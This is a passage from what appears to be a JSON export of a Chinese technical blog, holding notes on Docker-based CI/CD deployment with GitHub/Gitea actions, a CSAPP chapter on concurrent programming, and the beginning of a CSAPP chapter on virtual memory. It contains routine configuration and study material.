允许我们将自己的项目放入容器内运行，这样容器和宿主系统之间就是隔离的，我们就不用担心容器和宿主系统之间的影响，而只需要考虑不应被隔离的部分，如将容器内部的端口映射到宿主的哪个端口，以及容器内的文件/文件夹应该映射到宿主的哪个位置。\r\n\r\n### 3.1 Dockerfile\r\n\r\nAction 会根据 Dockerfile 来构建 Docker 镜像。Dockerfile 中主要配置运行的环境之类的，这里就简单列举一下不同语言大致的模板\r\n\r\n#### 3.1.1 Python\r\n\r\n```dockerfile\r\nFROM python:3.14.0rc3-slim\r\nWORKDIR /app\r\nCOPY . .\r\nRUN pip install --no-cache-dir -r requirements.txt\r\n...\r\n```\r\n\r\n#### 3.1.2 Node.js\r\n\r\n```dockerfile\r\nFROM node:iron-trixie-slim\r\nWORKDIR /app\r\n```\r\n\r\n### 3.2 Docker Registry\r\n\r\nAction 构建好镜像之后需要把镜像传到一个仓库中。虽然 Github 提供 docker 仓库，但如果你的服务器在国内的话可能会有网络问题。一个办法是自己在服务器上搭建 docker registry。\r\n\r\n首先创建一个 `auth` 目录，并在其中生成一个 `htpasswd` 用来配置 docker registry 的登录认证：\r\n\r\n```shell\r\nmkdir auth\r\nsudo apt install apache2-utils\r\nhtpasswd -Bbn 用户名 密码 > auth/htpasswd\r\n```\r\n\r\n然后执行\r\n\r\n```shell\r\ndocker run -d \\\r\n  -p 5000:5000 \\\r\n  --restart=always \\\r\n  --name registry \\\r\n  -v 上面创建的auth目录的地址:/auth \\\r\n  -e \"REGISTRY_AUTH=htpasswd\" \\\r\n  -e \"REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm\" \\\r\n  -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \\\r\n  -v registry数据存放的目录:/var/lib/registry \\\r\n  registry:2.7.0\r\n```\r\n\r\n不出意外的话 registry 就跑起来了。\r\n\r\ndocker registry 默认是 http 的，但这样的话，你在别的地方登录自己的 registry 时会报错，让你用 https。如果你执意要用 http 的话需要把自己的 registry 地址添加到 docker 的配置文件中然后再重启 docker 服务，非常麻烦。简单起见我们还是考虑配置 https，使用反向代理即可。\r\n\r\n需要注意的是，如果你使用 nginx 的话，还需要调整一下最大上传大小：\r\n\r\n```\r\nclient_max_body_size 1024m;\r\n```\r\n\r\n### 3.3 DockerCompose\r\n\r\n直接运行 Docker 容器的话，如果启动容器需要的配置多了起来，那么启动容器的命令就会很长。同时，我们的项目可能由多个组件构成，比如可能还会用到 MySQL，Redis，Meilisearch，或者对于 Next.js 项目可能除了运行一个 Next.js 还需要运行一个 Rust 后端，此时再单个容器地管理就比较困难了，而把这些组件全部放入一个容器中也不是一个好选择（容器应该满足单一职责）。 而 DockerCompose 可以让我们把多个容器看成整体地管理。\r\n\r\nDockerCompose 是一个 yaml 文件。在一个目录中创建一个 `docker-compose.yaml`，那么这个目录就成为了一个”项目目录“，我们可以在这个目录下运行 `docker-compose up` 来启动整个项目，或是 `docker-compose down` 来终止整个项目。\r\n\r\n`docker-compose.yaml` 中需要填写整个项目需要的容器及配置，如：\r\n\r\n```yaml\r\nversion: '3'\r\nservices:\r\n\tcontainer1:\r\n        image: 镜像的名称\r\n        container_name: 容器名称\r\n        restart: unless-stopped # 重启策略\r\n        # 设置容器内的环境变量\r\n        env_file:\r\n          - .env\r\n        environment:\r\n          - key=value\r\n      \tports:\r\n          ... # 映射的端口\r\n      \tvolumes:\r\n      \t  ... # 挂载卷\r\n  \tcontainer2:\r\n        depends_on:\r\n          - container1 # 设置依赖的容器，只有依赖的容器启动好之后才会启动当前这个容器\r\n```\r\n\r\n`docker-compose pull` 会检查当前项目所涉及到的所有容器是否存在更新，如果有更新的话则会拉取最新的镜像（只拉取需要更新的）因此使用 docker compose 之后，Action 中的部署过程就会非常简单：我们直接 ssh 连接到生产环境，然后 cd 到项目目录，然后：\r\n\r\n```shell\r\ndocker-compose down\r\ndocker-compose pull\r\ndocker-compose up -d\r\ndocker container prune -f\r\ndocker rmi -f $(docker images | grep '<none>' | awk '{print $3}')\r\ndocker image prune -a -f\r\n```\r\n\r\n其中最后三行则会清理无用的容器和镜像（Docker 中拉取新的镜像后，原来的镜像还保留，需要手动删除。\r\n\r\n使用 docker compose 还需要注意一个问题。位于同一个 docker compose 的容器之间进行网络通信的话，需要使用 service 的名称来当地址。比如原来连接 MySQL 可能是 `localhost:3306` ，现在把 MySQL 作为位于同一 docker compose 的容器，并且定义该容器的 service 名称为 `db`，那么就需要使用 `db:3306` 来连接。\r\n\r\n## 4. 其他问题\r\n\r\n### 4.1 Next.js 项目\r\n\r\n对于 Next.js 项目，我一般会使用 standalone 方式进行部署。在项目的 `next.config.ts` 中设置：\r\n\r\n```ts\r\nconst nextConfig: NextConfig = {\r\n\t/* config options here */\r\n\toutput: \"standalone\",\r\n};\r\n```\r\n\r\n然后需要复制文件：\r\n\r\n```yaml\r\n- name: Prepare artifacts\r\n  run: |\r\n    mkdir -p deploy\r\n    cp -r public deploy/\r\n    cp -r .next/standalone/{.[!.]*,*} deploy/\r\n    cp -r .next/static deploy/.next/static/\r\n```\r\n\r\n由于 Next.js 的编译产物中有一些 `.` 开头的文件/文件，这使得我们在复制的时候需要使用 `{.[!.]*,*}` 避免 `cp` 忽略了这些文件。\r\n\r\n同理，如果我们需要 `actions/upload-artifact@v4`，那么还需要：\r\n\r\n```yaml\r\n- uses: actions/upload-artifact@v4\r\n  with:\r\n    name: deploy-artifacts\r\n    path: deploy/\r\n    include-hidden-files: true #这里\r\n```\r\n\r\n### 4.2 Rust 静态编译\r\n\r\nRust 在 Linux 上编译时默认使用 glibc。而 glibc 是动态链接的，这导致如果你的生产环境上的 glibc 版本较低时就无法运行了。如果你不方便更新 glibc 版本的话，就需要考虑 musl 了，musl 是静态链接的。\r\n\r\n首先需要安装一些工具：\r\n\r\n```shell\r\napt-get install -y musl-tools\r\n```\r\n\r\n然后按 `2.4.2` 中所述，设置 `target: x86_64-unknown-linux-musl`，再编译就可以了。\r\n\r\n有些 crate 使用了 `openssl` 而不是 `rustls` ，此时使用 `musl` 编译会出现问题。解决办法是在 `Cargo.toml` 中添加：\r\n\r\n```toml\r\n[target.'cfg(not(windows))'.dependencies]\r\nopenssl = { version = \"0.10\", features = [\"vendored\"] }\r\n```\r\n\r\n### 4.2 自建 Gitea 引发的问题\r\n\r\n上面的内容在 Github 上面进行应该是问题不大的。但如果你选择了自建 Gitea，则会有新的注意事项。\r\n\r\n#### 4.2.1 网络问题\r\n\r\n我们的 Gitea 是放在国内服务器上的，因此会出现一些网络问题。\r\n\r\n**Action**\r\n\r\nAction 中引用的外部 action 默认都是从 github 上拉取的。我们的解决方案是在 gitee 上建一个镜像仓库，然后引用 gitee 上的 action。\r\n\r\n**rust**\r\n\r\n为 rustup 和 cargo 设置镜像。同时我们把 `2.4.2` 的内容整合在一起，形成了新的 action：\r\n\r\n```yaml\r\nname: Setup Toolchain\r\n\r\nruns:\r\n  using: \"composite\"\r\n  steps:\r\n    - name: Rustup Mirror\r\n      run: |\r\n        echo \"RUSTUP_DIST_SERVER=https://mirrors.tuna.tsinghua.edu.cn/rustup\" >> $GITHUB_ENV\r\n        echo \"RUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup\" >> $GITHUB_ENV\r\n\r\n    - name: Setup Toolchain\r\n      uses: https://gitee.com/skr2005/setup-rust-toolchain@main\r\n      with:\r\n        toolchain: stable\r\n        target: x86_64-unknown-linux-musl\r\n        components: clippy, rustfmt\r\n        cache-all-crates: \"true\"\r\n\r\n    - run: echo \"/root/.cargo/bin\" >> $GITHUB_PATH\r\n\r\n    - name: Crates Mirror\r\n      run: |\r\n        mkdir -vp ${CARGO_HOME:-$HOME/.cargo}\r\n\r\n        cat << EOF | tee -a ${CARGO_HOME:-$HOME/.cargo}/config.toml\r\n        [source.crates-io]\r\n        replace-with = 'ustc'\r\n\r\n        [source.ustc]\r\n        registry = \"sparse+https://mirrors.ustc.edu.cn/crates.io-index/\"\r\n\r\n        [registries.ustc]\r\n        index = \"sparse+https://mirrors.ustc.edu.cn/crates.io-index/\"\r\n        EOF\r\n```\r\n\r\n**python**\r\n\r\n为 `pip` 设置镜像：\r\n\r\n```shell\r\nRUN pip install --no-cache-dir -r requirements.txt -i https://pypi.mirrors.ustc.edu.cn/simple/\r\n```\r\n\r\n**apt**\r\n\r\n我们还需要为 action runner 中的 apt 添加镜像。我们同时整合了设置 `musl-tools`，得到了如下的 Dockerfile：\r\n\r\n```dockerfile\r\nFROM gitea/runner-images:ubuntu-22.04\r\n\r\n# 设置 TUNA 清华源、清除不需要的源，安装 musl-tools\r\nRUN sed -i 's|http://.*.ubuntu.com|http://mirrors.tuna.tsinghua.edu.cn|g' /etc/apt/sources.list \\\r\n    && rm -f /etc/apt/sources.list.d/* \\\r\n    && apt-get update \\\r\n    && apt-get install -y musl-tools # \\\r\n```\r\n\r\n构建上述镜像，并设置 `musl-ubuntu:ubuntu-22.04` 的 tag。在 gitea 的配置文件中设置：\r\n\r\n```yaml\r\nlabels:\r\n  - \"ubuntu-22.04:docker://musl-ubuntu:ubuntu-22.04\"\r\n```\r\n\r\n类似的方法还可以用在其他需要用到 apt 的 Dockerfile 中。\r\n\r\n#### 4.2.2 跨 Job 传输文件\r\n\r\n这个事我们已经在 `2.7` 中说了。但是需要注意一点，这个 `actions/upload-artifact@v4` 是将文件从 action runner 中上传到 gitea 所在的服务器的。如果 runner 和 gitea 不在一个服务器上，那么这个过程可能会很慢。\r\n\n","summary":"本文介绍了使用GitHub Actions和Docker实现博客自动化部署的流程，包括Action配置、Docker镜像构建、SSH部署及解决网络问题的方法，旨在简化代码提交后的自动编译和部署。","key":["CI/CD","github","gitea","action","docker","next.js","rust"],"tags":[],"path":["开发","自动化部署：Action + Docker.md"],"background":"https://api.file.caiwen.work/picture/2025/11/01/20251101192050784.png","recommend":false,"status":"published"},{"type":"Article","title":"CSAPP第十二章 - 并发编程","id":"csapp-12","createTime":"2025-10-03T05:28:00.000Z","updateTime":"2025-10-07T06:38:53.560Z","content":"\r\n\r\n\r\n## 1. 多进程\r\n\r\n每当需要监听一个文件描述符时，我们就启动一个子进程，让这个子进程专门去处理这个文件描述符。\r\n\r\n有一些注意点：\r\n\r\n* 可能会启动很多子进程，我们需要来处理 `SIGCHLD` 信号来回收僵尸子进程的资源\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003140713860.png)\r\n\r\n* 父进程和子进程可能需要关闭一些文件描述符来避免内存泄漏。比如在一个服务端程序中，父进程会有一个监听描述符，当有一个连接进入的时候，会创建一个已连接描述符。`fork` 之后，子进程也有了监听描述符和已连接描述符。对于子进程来说，监听描述符是没必要的，需要关闭。对于父进程来说，已连接描述符是没必要的，需要关闭。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003145607955.png)\r\n\r\n这样做有一些缺点，比如父子进程的通信会有点麻烦。\r\n\r\n## 2. 多路复用\r\n\r\n我们可以使用 `select` 函数实现多路复用。\r\n\r\n`int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);`\r\n\r\n* 包含在 `sys/select.h` 中\r\n* 内核会监听文件描述符的值位于 $0$ 到 $n-1$ 且在 `readfds`、`writefds`、`exceptfds` 中设置的文件描述符。所以一般将 `n` 设置为监听的文件描述符的最大值再加一\r\n* `readfds` 存放要监听读事件的文件描述符，`writefds` 监听写事件，`exceptfds` 监听异常事件（网络连接的描述符可能会产生异常事件）。有如下的宏来操作 `fd_set` ：\r\n  * `FD_ZERO(fd_set *fdset)`：将 `fdset` 清空\r\n  * `FD_CLR(int fd, fd_set *fdset)`：在 `fdset` 中删去 `fd`\r\n  * `FD_SET(int fd, fd_set *fdset)`：把 `fd` 加入到 `fdset` 中\r\n  * `FD_ISSET(int fd, fd_set *fdset)`：判断 `fd` 是否位于 `fdset` 中\r\n* `timeout` 用于设置 `select` 函数的超时事件\r\n  * `struct timeval` 的定义为：`struct timeval { long tv_sec; long tv_usec; }` 。其中 `tv_sec` 表示秒数，`tv_usec` 表示微秒数（$1 \\text{s} = 10^6\\text{us}$）\r\n  * 设置的超时时间为 $\\text{tv\\_sec} + \\text{tv\\_usec}$\r\n  * 如果不需要设置超时时间的话传入 `NULL`\r\n* `select` 函数会一致堵塞，直到有事件准备就绪，或是超时，或是被 `SIGINT` 中断。返回准备就绪的文件描述符的个数。并会修改 `readfds`、`writefds`、`exceptfds` 为准备好该事件的文件描述符的集合\r\n* 在大多数系统中，`fd_set` 的大小由宏 `FD_SETSIZE` 定义，通常为 1024。这也就意味着 `n` 最多给 1024，且 `select` 只能监听文件描述符值在 0 到 1023 范围内的文件描述符。由于这个限制，`select` 函数只适合低并发场景\r\n\r\n![等待监听描述符上的连接请求和标准输入](https://api.file.caiwen.work/picture/2025/10/03/image-20251003145639691.png)\r\n\r\n多路复用一直在单一的上下文中运行，不存在上下文切换的开销，并且使得数据共享和调试都更加容易。但使用多路复用有一些缺点：\r\n\r\n* 从上述代码中我们可以看到，事件发生后，只有当前事件处理完毕之后才能继续执行下一个事件。这使得如果事件执行地很慢，或是有人故意产生大量垃圾事件，就会阻碍程序继续处理别的事件。\r\n* 多路复用不能利用多核处理器的优势\r\n\r\n## 3. 线程\r\n\r\n### 3.1 pthread\r\n\r\n`int pthread_create(pthread_t *tid, pthread_attr_t *attr, func *f, void *arg)`\r\n\r\n* 包含在 `pthread.h` 中\r\n* 其中 `func` 类型的定义为 `typedef void *(func)(void *);`\r\n* 创建的线程的 id 会被放入到 `tid` 中\r\n* `attr` 用来设置新创建的线程的默认属性，一般可以设置为 `NULL`\r\n* `f` 接受一个函数指针\r\n* `arg` 是传递给线程的参数\r\n* 创建一个线程，成功则返回 0，失败则返回非零\r\n\r\n`pthread_t pthread_self(void)`\r\n\r\n* 包含在 `pthread.h` 中\r\n* 返回当前线程的 id\r\n\r\n`void pthread_exit(void *thread_return)`\r\n\r\n* 包含在 `pthread.h` 中\r\n* 结束当前线程，并以 `thread_return` 作为返回值。效果类似直接 `return`。如果主线程调用该函数，则会等待其他线程终止，然后再终止主线程和整个进程\r\n* 如果一个线程直接调用 `exit` 的话会直接终止整个进程\r\n\r\n`int pthread_cancel(pthread_t tid)`\r\n\r\n* 包含在 `pthread.h` 中\r\n* 终止 id 为 `tid` 的线程\r\n* 成功返回 0，失败返回非零\r\n\r\n`int pthread_join(pthread_t tid, void **thread_return)`\r\n\r\n* 包含在 `pthread.h` 中\r\n* 等待 id 为 `tid` 的线程终止，并回收该线程的资源，并把线程的返回值放到 `thread_return` 中\r\n* 成功返回 0，失败返回非零\r\n\r\n`int pthread_detach(pthread_t tid)`\r\n\r\n* 包含在 `pthread.h` 中\r\n* 将 id 为 `tid` 的线程分离\r\n* 成功返回 0，失败返回非零\r\n* 一般情况下，线程结束之后，其资源（例如栈）不会被立即回收。需要使用 `pthread_join` 来显式等待线程结束并回收。但有时我们不希望显式等待线程结束，就可以使用 `pthread_detach` 将线程分离，分离后的线程结束之后将会由系统自动回收资源\r\n\r\n`int pthread_once(pthread_once_t *once_control, void (*init_routine)(void))`\r\n\r\n* 包含在 `pthread.h` 中\r\n* 该函数可以保证对于同一个 `once_control`，不管有多少个线程调用多少次 `pthread_once`，`init_routine` 执行且仅执行一次。这主要用于在多个线程之间进行共享的变量的初始化\r\n* `once_control` 一般要声明为 static 。并且设置初始值为 `PTHREAD_ONCE_INIT`\r\n* 总是返回 0\r\n\r\n### 3.2 信号量\r\n\r\n`int sem_init(sem_t *sem, int pshared, unsigned int value)`\r\n\r\n* 包含在 `semaphore.h` 中\r\n* 将内存位置 `sem` 初始化为一个信号量\r\n* `pshared` 为 0 则表示信号量是在同一进程的不同线程之间共享。为非 0 则表示信号量是跨进程共享的，此时可能还要考虑结合 `mmap` 来共享内存\r\n* 信号量的初始值为 `value`\r\n\r\n* 成功则返回 0，失败则返回 -1\r\n\r\n`int sem_wait(sem_t *s)`\r\n\r\n* 包含在 `semaphore.h` 中\r\n\r\n* 尝试将信号量减一。如果信号量之前已经为 0 了则堵塞\r\n* 该操作也称为 P 操作\r\n* 成功则返回 0，失败则返回 -1\r\n\r\n`int sem_post(sem_t *s)`\r\n\r\n* 包含在 `semaphore.h` 中\r\n\r\n* 尝试将信号量加一。如果信号量之前已经为 0 了则会唤醒被堵塞的 `sem_wait`\r\n* 该操作也称为 V 操作\r\n* 成功则返回 0，失败则返回 -1\r\n\r\n#### 3.2.1 生产-消费者问题\r\n\r\n我们考虑实现一个生产/消费模式的队列。这个队列有一个缓冲区。当缓冲区为空时，再次从队列取元素则会堵塞。当缓冲区满时，再次往队列中加入元素则会堵塞。\r\n\r\n![要维护的数据](https://api.file.caiwen.work/picture/2025/10/03/image-20251003162243471.png)\r\n\r\n![具体实现](https://api.file.caiwen.work/picture/2025/10/03/image-20251003162333812.png)\r\n\r\n维护 `slots` 和 `items` 信号量的目的在于确保有空位或是元素时再拿锁访问缓冲区，以完成 insert 和 remove 操作。\r\n\r\n#### 3.2.2 读者-写者问题\r\n\r\n如果一些线程只对某个数据进行读，另一些线程只对这个数据进行写，此时我们考虑，可以有任意数量的仅读线程进入 critical section，只需要限制有一个仅写线程进入 critical section 即可。\r\n\r\n读者-写者问题有几个变种，下面是其中两种：\r\n\r\n**第一类读者-写者问题：读者有更高的优先级**\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003164639596.png)\r\n\r\n当有读者访问的时候，就加锁（`w` 对应的锁）。这样使得有读者在时写者就进不来，但 `w` 锁并不排斥其他的读者，也就是多个读者可以同时访问。由于我们需要记录一下当前读者是不是第一个读者或是最后读者来决定 `w` 锁的获取和释放，所以我们还需要再加一个 `mutex` 锁。\r\n\r\n这个解答也会带来其他的问题：\r\n\r\n* 可能导致饥饿（即一个线程无限期地阻塞，无法进展）。因为可能有读者不断地到达，于是写者就不断地等待。\r\n* 读者的优先级并非很高，某种意义上反而很弱。比如当一个写者进入 critical section 并离开时，其可能唤醒另一个写者而并非唤醒另一个读者，使得读者饥饿。\r\n\r\n**第二类读者-写者问题：写者有更高的优先级**\r\n\r\n类似第一类。\r\n\r\n### 3.3 预线程化\r\n\r\n如果类似多进程那样，每次有一个连接进来就启动一个线程来进行处理的话，会支付很高的创建线程的代价。我们可以使用预线程化的技术来优化。我们预先创建一定数量的工作者线程，只需要这些线程来处理客户端的连接：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003172036786.png)\r\n\r\n### 3.4 线程安全\r\n\r\n有如下几类线程不安全的函数：\r\n\r\n* **不保护共享变量**：函数直接修改全局变量而不带锁。将这样的函数变为线程安全比较简单，只需要加锁即可。\r\n* **保持跨越多个调用状态的函数**：当前函数调用的结果依赖于前一次调用的结果。这样的函数可能是内部维护了一个全局变量。比如 `rand` 函数，如果给定随机数种子，在单线程中反复调用，得到的结果是确定的，但是在多线程中不是了，即使加锁都不好使（无 data race 但有 determinacy race）。将这类函数变为线程安全的，需要把函数内部依赖的全局变量作为函数的参数。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003173925230.png)\r\n\r\n* **返回指向静态变量的指针的函数**：一些函数，如 `ctime`、`gethostbyname` ，会将计算结果放在一个 static 变量中，然后返回指向该变量的指针。在多线程情况下，很有可能一个线程的调用把另一个线程调用的结果的数据覆盖了。如果想把这类函数变为线程安全的，除了重写函数外，还可以使用加锁-复制技术，即调用前后加锁，然后把数据复制出来。但是这个技术也有个缺点，如果函数返回的指针指向的数据中还包含指向另一个数据的指针，那么我们就需要 deep copy。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003174531853.png)\r\n\r\n* **调用线程不安全的函数**：把这类函数变成线程安全的，除了重写以外没什么好办法了，因为我们不清楚其调用的线程不安全函数是不是第二类。\r\n\r\n如果一个函数不依赖任何全局变量，我们就称这种函数是**可重入函数**，这种函数一定是线程安全的，并且肯定是无锁的，效率更高。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003175322251.png)\r\n\r\n更细分一下，如果一个可重入函数的所有参数都是按值传递的，没有传递指针，那么我们就说这个函数是**显式可重入的**。反之，我们称之为**隐式可重入的**。对于隐式可重入函数，如果其传递的指针没有被共享，那么该函数就是可重入的，否则，该函数就是不可重入的。\r\n\r\nLinux 中的一些线程不安全函数有可重入版本，可重入版本的名字总是以 `_r` 后缀结尾，我们应尽可能使用可重入函数：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003175830217.png)\r\n\r\n### 3.5 死锁\r\n\r\n我们可以把要执行的代码分成几个部分：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003183719812.png)\r\n\r\n然后我们有进度图：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003183813678.png)\r\n\r\n然后一条轨迹线就代表一种并发执行情况。轨迹线只会往右往上走。\r\n\r\n如果 L、U、S 三个部分的执行出现交错，那么就会出现 data race：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003184006309.png)\r\n\r\n我们可以使用锁来使得不安全区变为禁止区，这样轨迹线就不会经过那里。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003184107570.png)\r\n\r\n当出现两个锁的时候就会引入两个禁止区：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003184153984.png)\r\n\r\n当轨迹线进入到死锁区后，由于其方向是向右或者是向上的，所以无论怎样都会进入到禁止区，这就产生了死锁。\r\n\r\n有一个简单的规则可以避免死锁：给定所有互斥操作的一个全序，如果每个线程都是以一种顺序获得互斥锁并以相反的顺序释放，那么这个程序就是无死锁的。\r\n\r\n按照这个规则，在进度图上，每个锁产生的禁止区的左下角的点，在这个二维坐标系上是以斜向上的方向进行排列的，使得不会出现死锁区。\r\n\r\n**Dining Philosophers 问题**\r\n\r\n这是一个经典的并行问题。问题可以看成有若干个人围坐在一个圆桌上，每个人的两边都有一双筷子。如果一个人拿到了两个筷子，那么其两边的人就拿不到完整的一双筷子，就需要等待。\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003214504305.png)\r\n\r\n一个代码如下：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/10/03/image-20251003214554999.png)\r\n\r\n这个代码就会出现死锁，因为有可能每个人都只拿到了其右手边的筷子，每个人都等待其左手边的筷子，从而出现死锁。\r\n\r\n解决方法是按照我们刚才说的规则。我们先拿 `min(i, (i+1)%n)` 的锁，再拿 `max(i, (i+1)%n)` 的锁，这样就不会出现死锁。\r\n\r\n\n","summary":"文章介绍了多进程、多路复用和线程三种并发编程方法，包括实现细节、优缺点及常见问题如死锁和线程安全，并提供了解决方案。","key":["csapp","并发","多路复用","线程","pthread","死锁","线程安全"],"tags":[],"path":["cs","csapp","CSAPP第十二章 - 并发编程.md"],"background":"https://api.file.caiwen.work/picture/2025/10/07/20251007143747366.png","recommend":false,"status":"published"},{"type":"Article","title":"CSAPP第九章 - 虚拟内存","id":"csapp-9","createTime":"2025-09-28T07:40:00.000Z","updateTime":"2025-10-07T06:43:42.359Z","content":"\r\n\r\n\r\n## 1. 虚拟内存\r\n\r\n### 1.1 DRAM 作为缓存\r\n\r\n虚拟内存被组织为一个由存放在磁盘上连续的字节大小的单元组成的数组。DRAM 可以视为虚拟内存的缓存。\r\n\r\n如果虚拟内存在 DRAM 上不命中的话，那么就需要从磁盘上获取，导致非常大的不命中惩罚，这就使得 DRAM 应该是全相连的。\r\n\r\n同时，如果 DRAM 上缓存的虚拟页替换错了，那么也会导致很大的不命中惩罚，这就使得操作系统对 DRAM 缓存使用了更复杂精密的替换算法。\r\n\r\n考虑到磁盘的写速度很慢，于是 DRAM 缓存总是使用写回而不使用直写。\r\n\r\n### 1.2 地址翻译\r\n\r\n#### 1.2.1 MMU\r\n\r\n计算机中使用 MMU 这个硬件来支持虚拟内存的地址翻译。\r\n\r\n操作系统访问一个虚拟内存地址有如下的过程：\r\n\r\n![image-20250928161617836](https://api.file.caiwen.work/picture/2025/09/28/image-20250928161617836.png)\r\n\r\n* 操作系统访问一个虚拟内存地址后，处理器将其交给 MMU。\r\n* MMU 先根据虚拟地址计算出相应的 PTE 的地址（物理），在内存中获取 PTE。\r\n  * 如果 PTE 有效，则说明虚拟页面命中。MMU 根据虚拟内存地址和 PTE 的信息来生成物理地址，访问内存，获取到的数据直接返回给处理器。\r\n  * 如果 PTE 无效，说明虚拟页没有命中，发生缺页。MMU 随后调用先前设置的缺页异常处理程序。\r\n\r\n#### 1.2.2 结合高速缓存\r\n\r\n我们可以在 MMU 和 DRAM 中间加高速缓存（如 L1 缓存）：\r\n\r\n![](https://api.file.caiwen.work/picture/2025/09/28/image-20250928162002128.png)\r\n\r\n#### 1.2.3 利用 TLB 加速翻译\r\n\r\nCPU 每次访问一个虚拟地址，MMU 就需要先获取一个 PTE 然后再访问其对应的物理地址，也就是会从内存中多取一次数据。然而从 DRAM 访问数据需要上百个周期，这会导致性能下降地厉害。如果我们考虑到 MMU 和内存之间的高速缓存，比如 PTE 恰好缓存到 L1 中，那么开销就下降到 1 到 2 个周期。\r\n\r\n我们还可以再使用 TLB 来使得获取 PTE 的开销更小。TLB 是一个相连度比较高的缓存（甚至是全相连）。\r\n\r\n![image-20250928163213027](https://api.file.caiwen.work/picture/2025/09/28/image-20250928163213027.png)\r\n\r\nTLB 根据 TLBI 来选择相应的 cache set，然后根据 TLB 标记选择相应的 cache line。\r\n\r\nTLB 是内置在 MMU 的，所以 MMU 访问 TLB 的开销极小。\r\n\r\n虚拟地址的 VPO 和物理地址的 PPO 部分是相同的。在 Intel Core I7 上，VPO 为 12 位，L1 缓存有 64 个 cache set，每个 cache set 可容纳 8 个 cache line，一个 cache line 上有 64 个 cache block。因此，VPO 或者说是 PPO 的这 12 位刚好可以对应于某个 cache set 和 cache block。当进行地址翻译的时候，MMU 将虚拟地址的高 52 位（去掉了低 12 位）用来查 PTE 以获取物理地址的高 52 位（即 PPN）。而同时，虚拟地址的低 12 位被发送到 L1 缓存中来定位是哪个 cache set。当得到 PPN 时，L1 缓存已经准备好将 PPN 与 8 个 cache line 上的标记进行比对了。这两个过程同时执行，可以进一步增加效率。\r\n\r\n### 1.3 缺页处理\r\n\r\n在 Linux 中，操作系统还维护了当前进程虚拟内存映射的情况，比如：\r\n\r\n![image-20250928172205773](https://api.file.caiwen.work/picture/2025/09/28/image-20250928172205773.png)\r\n\r\n当 MMU 翻译某个虚拟内存地址产生缺页时，Linux 会借助维护的这个信息对缺页原因进行判断：\r\n\r\n![image-20250928172603708](https://api.file.caiwen.work/picture/2025/09/28/image-20250928172603708.png)\r\n\r\n* 如果虚拟内存没有落到任何区间中，那么说明产生了段错误，对应于情况 1\r\n* 然后检查维护的权限位，判断是否为情况 2\r\n* 如果都不是的话，说明是正常缺页\r\n\r\n在 X86 上，PTE 最低位有一个有效位，表示其覆盖的内存区域是否存在于物理内存中。最后一级页表的 PTE 上，如果有效位为 0，则剩余的高位由操作系统自行组织，一般是用来记录位于磁盘上的位置：\r\n\r\n![最后一级页表的 PTE](https://api.file.caiwen.work/picture/2025/09/28/image-20250928173602081.png)\r\n\r\n其实如果使用多级页表的话，只有第一级页表需要常驻内存，其余级别的页表像普通内存区域一样可以触发缺页。\r\n\r\n![非最后一级的页表 PTE](https://api.file.caiwen.work/picture/2025/09/28/image-20250928174026491.png)\r\n\r\n### 1.4 内存映射\r\n\r\n借助虚拟内存机制，我们可以有如下的操作：\r\n\r\n* Lazy allocation：当我们申请一块内存后，操作系统不会立刻给这块内存分配对应的物理页，而是程序实际用到的时候再分配。\r\n* Copy on write：多个进程都含有某个对象的时候（如一个可执行文件的不同进程），可以直接让其虚拟内存映射到同一个物理内存区域。当某个进程产生修改的时候，先将被共享的页复制，再应用修改。\r\n* Zero fill on demand：如果映射的区域全是 0 的话（比如 elf 的 bss 区域），那么操作系统不会真的去分配对应的物理页并清零，而是可能在 PTE 上标记一下，并映射到一个全为 0 的区域。当程序发生修改的时候，类似 copy on write 那样复制。\r\n\r\n* Demand paging：如果需要将磁盘上的某个文件放入内存的话，操作系统不会直接把文件的数据复制到内存中，而是当真正需要用到的时候触发缺页进行加载。\r\n\r\n我们可以使用 `mmap` 函数进行用户级的内存映射：\r\n\r\n`void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);`\r\n\r\n* 需要引用 `unistd.h` 和 `sys/mman.h` 两个头文件。\r\n* 请求内核创建以 `start` 开始，长度为 `length` 的内存区域。这个内存区域去映射文件描述符 `fd` 对应的资源的 `offset` 偏移处。\r\n* `start` 可以设为 `NULL`，此时将由内核自行决定分配到哪里。\r\n* `prot` 给定了映射区域的权限位：\r\n  * `PROT_EXEC`：可执行\r\n  * `PROT_READ`：可读\r\n  * `PROT_WRITE`：可写\r\n  * `PROT_NONE`：不能被访问\r\n* `flags` 给定了映射区域的特征：\r\n  * `MAP_ANON`：映射区域全是 0，内核将会按照 zero fill on demand 来处理。此时 `fd` 和 `offset` 参数都给 0 就可以了。\r\n  * `MAP_PRIVATE`：以私有方式进行映射。内核将使用 copy on write 机制，对映射区域的修改仅影响当前进程。\r\n  * `MAP_SHARE`：以共享方式进行映射。当进行 fork 的时候父子进程之间会共享这个区域，可以用来进行进程间通信。\r\n* 若成功则返回指向映射区域的指针，出错则返回 `MAP_FAILED(-1)`。\r\n\r\n`int munmap(void *start, size_t length);`\r\n\r\n* 需要引用 `unistd.h` 和 `sys/mman.h` 头文件。\r\n* 会解除 `start` 开始的 `length` 长度的区域的映射。\r\n\r\n使用 `MAP_ANON | MAP_PRIVATE` 可以创建一个全为 0 的私有区域。使用 `MAP_ANON | MAP_SHARED` 可以创建一个全为 0 